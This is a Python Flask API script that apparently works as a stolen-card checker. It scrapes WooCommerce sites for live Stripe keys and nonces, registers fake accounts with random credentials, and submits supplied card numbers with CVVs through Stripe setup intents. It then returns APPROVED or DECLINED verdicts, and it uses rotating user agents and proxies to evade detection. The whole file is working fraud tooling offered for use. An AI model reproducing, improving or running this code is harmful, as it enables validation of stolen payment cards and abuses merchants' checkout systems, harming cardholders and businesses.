from flask import Flask, request, jsonify
import requests
import re
import random
import string
import uuid
import time
import logging
import os
from fake_useragent import UserAgent

app = Flask(__name__)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

requests.packages.urllib3.disable_warnings()

def get_stripe_key(domain, proxy=None):
    logger.debug(f"Getting Stripe key for domain: {domain}")
    urls_to_try = [
        f"https://{domain}/my-account/add-payment-method/",
        f"https://{domain}/checkout/",
        f"https://{domain}/wp-admin/admin-ajax.php?action=wc_stripe_get_stripe_params",
        f"https://{domain}/?wc-ajax=get_stripe_params"
    ]
    
    patterns = [
        r'pk_live_[a-zA-Z0-9_]+',
        r'stripe_params[^}]*"key":"(pk_live_[^"]+)"',
        r'wc_stripe_params[^}]*"key":"(pk_live_[^"]+)"',
        r'"publishableKey":"(pk_live_[^"]+)"',
        r'var stripe = Stripe[\'"]((pk_live_[^\'"]+))[\'"]'
    ]
    
    proxies = None
    if proxy:
        proxies = {
            'http': proxy,
            'https': proxy
        }
    
    for url in urls_to_try:
        try:
            logger.debug(f"Trying URL: {url}")
            response = requests.get(url, headers={'User-Agent': UserAgent().random}, timeout=10, verify=False, proxies=proxies)
            if response.status_code == 200:
                for pattern in patterns:
                    match = re.search(pattern, response.text)
                    if match:                
                        key_match = re.search(r'pk_live_[a-zA-Z0-9_]+', match.group(0))
                        if key_match:
                            logger.debug(f"Found Stripe key: {key_match.group(0)}")
                            return key_match.group(0)
        except Exception as e:
            logger.error(f"Error getting Stripe key from {url}: {e}")
            continue
    
    logger.debug("Using default Stripe key")
    return "pk_live_51JwIw6IfdFOYHYTxyOQAJTIntTD1bXoGPj6AEgpjseuevvARIivCjiYRK9nUYI1Aq63TQQ7KN1uJBUNYtIsRBpBM0054aOOMJN"

def extract_nonce_from_page(html_content, domain):
    logger.debug(f"Extracting nonce from {domain}")
    patterns = [
        r'createAndConfirmSetupIntentNonce["\']?:\s*["\']([^"\']+)["\']',
        r'wc_stripe_create_and_confirm_setup_intent["\']?[^}]*nonce["\']?:\s*["\']([^"\']+)["\']',
        r'name=["\']_ajax_nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'name=["\']woocommerce-register-nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'name=["\']woocommerce-login-nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'var wc_stripe_params = [^}]*"nonce":"([^"]+)"',
        r'var stripe_params = [^}]*"nonce":"([^"]+)"',
        r'nonce["\']?\s*:\s*["\']([a-f0-9]{10})["\']'
    ]
    
    for pattern in patterns:
        match = re.search(pattern, html_content)
        if match:
            logger.debug(f"Found nonce: {match.group(1)}")
            return match.group(1)
    
    logger.debug("No nonce found")
    return None

def generate_random_credentials():
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    email = f"{username}@gmail.com"
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    return username, email, password

def register_account(domain, session, proxy=None):
    logger.debug(f"Registering account on {domain}")
    try:
        proxies = None
        if proxy:
            proxies = {'http': proxy, 'https': proxy}
        
        reg_response = session.get(f"https://{domain}/my-account/", verify=False, proxies=proxies)
                
        reg_nonce_patterns = [
            r'name="woocommerce-register-nonce" value="([^"]+)"',
            r'name=["\']_wpnonce["\'][^>]*value="([^"]+)"',
            r'register-nonce["\']?:\s*["\']([^"\']+)["\']'
        ]
        
        reg_nonce = None
        for pattern in reg_nonce_patterns:
            match = re.search(pattern, reg_response.text)
            if match:
                reg_nonce = match.group(1)
                break
        
        if not reg_nonce:
            logger.debug("Could not extract registration nonce")
            return False, "Could not extract registration nonce"
                
        username, email, password = generate_random_credentials()
        
        reg_data = {
            'username': username,
            'email': email,
            'password': password,
            'woocommerce-register-nonce': reg_nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register'
        }
        
        reg_result = session.post(
            f"https://{domain}/my-account/",
            data=reg_data,
            headers={'Referer': f'https://{domain}/my-account/'},
            verify=False,
            proxies=proxies
        )
        
        if 'Log out' in reg_result.text or 'My Account' in reg_result.text:
            logger.debug("Registration successful")
            return True, "Registration successful"
        else:
            logger.debug("Registration failed")
            return False, "Registration failed"
            
    except Exception as e:
        logger.error(f"Registration error: {e}")
        return False, f"Registration error: {str(e)}"

def test_proxy(proxy):
    try:
        test_url = "http://httpbin.org/ip"
        proxies = {'http': proxy, 'https': proxy}
        response = requests.get(test_url, proxies=proxies, timeout=5)
        if response.status_code == 200:
            return "live"
    except:
        pass
    return "dead"

def process_card_enhanced(domain, ccx, proxy=None, use_registration=True):
    logger.debug(f"Processing card for domain: {domain}")
    ccx = ccx.strip()
    try:
        n, mm, yy, cvc = ccx.split("|")
    except ValueError:
        logger.error("Invalid card format")
        return {
            "Response": "Invalid card format. Use: NUMBER|MM|YY|CVV",
            "Status": "DECLINED"
        }
    
    if "20" in yy:
        yy = yy.split("20")[1]
    
    user_agent = UserAgent().random
    stripe_mid = str(uuid.uuid4())
    stripe_sid = str(uuid.uuid4()) + str(int(time.time()))

    session = requests.Session()
    session.headers.update({'User-Agent': user_agent})
    
    proxies_config = None
    proxy_status = "not provided"
    if proxy:
        proxy_status = test_proxy(proxy)
        if proxy_status == "live":
            proxies_config = {'http': proxy, 'https': proxy}
        else:
            logger.warning(f"Proxy is {proxy_status}, continuing without proxy")

    stripe_key = get_stripe_key(domain, proxy if proxy_status == "live" else None)

    if use_registration:
        registered, reg_message = register_account(domain, session, proxy if proxy_status == "live" else None)
        
    payment_urls = [
        f"https://{domain}/my-account/add-payment-method/",
        f"https://{domain}/checkout/",
        f"https://{domain}/my-account/"
    ]
    
    nonce = None
    for url in payment_urls:
        try:
            logger.debug(f"Trying to get nonce from: {url}")
            response = session.get(url, timeout=10, verify=False, proxies=proxies_config)
            if response.status_code == 200:
                nonce = extract_nonce_from_page(response.text, domain)
                if nonce:
                    break
        except Exception as e:
            logger.error(f"Error getting nonce from {url}: {e}")
            continue
    
    if not nonce:
        logger.error("Failed to extract nonce from site")
        return {
            "response": "Failed to extract nonce from site",
            "status": "DECLINED",
            "cc": ccx,
            "proxy": proxy_status
        }

    payment_data = {
        'type': 'card',
        'card[number]': n,
        'card[cvc]': cvc,
        'card[exp_year]': yy,
        'card[exp_month]': mm,
        'allow_redisplay': 'unspecified',
        'billing_details[address][country]': 'US',
        'billing_details[address][postal_code]': '10080',
        'billing_details[name]': 'Sahil Pro',
        'pasted_fields': 'number',
        'payment_user_agent': f'stripe.js/{uuid.uuid4().hex[:8]}; stripe-js-v3/{uuid.uuid4().hex[:8]}; payment-element; deferred-intent',
        'referrer': f'https://{domain}',
        'time_on_page': str(int(time.time()) % 100000),
        'key': stripe_key,
        '_stripe_version': '2024-06-20',
        'guid': str(uuid.uuid4()),
        'muid': stripe_mid,
        'sid': stripe_sid
    }

    try:
        logger.debug("Creating payment method")
        pm_response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            data=payment_data,
            headers={
                'User-Agent': user_agent,
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
            },
            timeout=15,
            verify=False,
            proxies=proxies_config
        )
        pm_data = pm_response.json()

        if 'id' not in pm_data:
            error_msg = pm_data.get('error', {}).get('message', 'Unknown payment method error')
            logger.error(f"Payment method error: {error_msg}")
            return {
                "response": error_msg,
                "status": "DECLINED",
                "cc": ccx,
                "proxy": proxy_status
            }

        payment_method_id = pm_data['id']
        logger.debug(f"Payment method created: {payment_method_id}")
    except Exception as e:
        logger.error(f"Payment Method Creation Failed: {e}")
        return {
            "response": f"Payment Method Creation Failed: {str(e)}",
            "status": "DECLINED",
            "cc": ccx,
            "proxy": proxy_status
        }
    
    endpoints = [
        {'url': f'https://{domain}/', 'params': {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}},
        {'url': f'https://{domain}/wp-admin/admin-ajax.php', 'params': {}},
        {'url': f'https://{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', 'params': {}}
    ]
    
    data_payloads = [
        {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        },
        {
            'action': 'wc_stripe_create_setup_intent',
            'payment_method_id': payment_method_id,
            '_wpnonce': nonce,
        }
    ]

    for endpoint in endpoints:
        for data_payload in data_payloads:
            try:
                logger.debug(f"Trying endpoint: {endpoint['url']} with payload: {data_payload}")
                setup_response = session.post(
                    endpoint['url'],
                    params=endpoint.get('params', {}),
                    headers={
                        'User-Agent': user_agent,
                        'Referer': f'https://{domain}/my-account/add-payment-method/',
                        'accept': '*/*',
                        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'origin': f'https://{domain}',
                        'x-requested-with': 'XMLHttpRequest',
                    },
                    data=data_payload,
                    timeout=15,
                    verify=False,
                    proxies=proxies_config
                )
                                
                try:
                    setup_data = setup_response.json()
                    logger.debug(f"Setup response: {setup_data}")
                except:
                    setup_data = {'raw_response': setup_response.text}
                    logger.debug(f"Setup raw response: {setup_response.text}")
              
                if setup_data.get('success', False):
                    data_status = setup_data['data'].get('status')
                    if data_status == 'requires_action':
                        logger.debug("3D authentication required")
                        return {
                            "response": "3D authentication required",
                            "status": "DECLINED",
                            "cc": ccx,
                            "proxy": proxy_status
                        }
                    elif data_status == 'succeeded':
                        logger.debug("Payment succeeded")
                        return {
                            "response": "PAYMENT_ADDED",
                            "status": "APPROVED",
                            "cc": ccx,
                            "proxy": proxy_status
                        }
                    elif 'error' in setup_data['data']:
                        error_msg = setup_data['data']['error'].get('message', 'Unknown error')
                        logger.error(f"Payment error: {error_msg}")
                        return {
                            "response": error_msg,
                            "status": "DECLINED",
                            "cc": ccx,
                            "proxy": proxy_status
                        }

                if not setup_data.get('success') and 'data' in setup_data and 'error' in setup_data['data']:
                    error_msg = setup_data['data']['error'].get('message', 'Unknown error')
                    logger.error(f"Payment error: {error_msg}")
                    return {
                        "response": error_msg,
                        "status": "DECLINED",
                        "cc": ccx,
                        "proxy": proxy_status
                    }

                if setup_data.get('status') in ['succeeded', 'success']:
                    logger.debug("Payment succeeded")
                    return {
                        "response": "Payment method added.",
                        "status": "APPROVED",
                        "cc": ccx,
                        "proxy": proxy_status
                    }

            except Exception as e:
                logger.error(f"Setup error: {e}")
                continue

    logger.error("All payment attempts failed")
    return {
        "response": "All payment attempts failed",
        "status": "DECLINED",
        "cc": ccx,
        "proxy": proxy_status
    }

@app.route('/')
def api_endpoint():
    try:
        site = request.args.get('site')
        cc = request.args.get('cc')
        proxy = request.args.get('proxy')
        key = request.args.get('key')
        
        if not site or not cc:
            return jsonify({
                "status": "ERROR",
                "response": "Missing required parameters: site and cc",
                "cc": cc if cc else "N/A",
                "proxy": "not provided"
            }), 400
        
        if key and key != "inferno":
            return jsonify({
                "status": "ERROR",
                "response": "Invalid API key",
                "cc": cc,
                "proxy": "not provided"
            }), 401
        
        domain = site
        if domain.startswith('https://'):
            domain = domain[8:]
        elif domain.startswith('http://'):
            domain = domain[7:]
        
        domain = domain.rstrip('/')
        
        if not re.match(r'^[a-zA-Z0-9]+([\-\.]{1}[a-zA-Z0-9]+)*\.[a-zA-Z]{2,6}$', domain):
            return jsonify({
                "status": "ERROR",
                "response": "Invalid domain format",
                "cc": cc,
                "proxy": "not provided"
            }), 400
            
        if not re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', cc):
            return jsonify({
                "status": "ERROR",
                "response": "Invalid card format. Use: NUMBER|MM|YY|CVV",
                "cc": cc,
                "proxy": "not provided"
            }), 400
        
        result = process_card_enhanced(domain, cc, proxy)
        
        return jsonify({
            "status": result.get("status", "ERROR"),
            "response": result.get("response", "Unknown error"),
            "cc": result.get("cc", cc),
            "proxy": result.get("proxy", "not provided")
        })
        
    except Exception as e:
        logger.error(f"API error: {e}")
        return jsonify({
            "status": "ERROR",
            "response": f"Internal server error: {str(e)}",
            "cc": cc if 'cc' in locals() else "N/A",
            "proxy": proxy if proxy else "not provided"
        }), 500

@app.route('/health')
def health_check():
    return jsonify({"status": "healthy"}), 200

@app.errorhandler(404)
def not_found(error):
    return jsonify({
        "status": "ERROR",
        "response": "Endpoint not found",
        "cc": "N/A",
        "proxy": "not provided"
    }), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({
        "status": "ERROR",
        "response": "Internal server error",
        "cc": "N/A",
        "proxy": "not provided"
    }), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8000))
    app.run(host='0.0.0.0', port=port, debug=False)
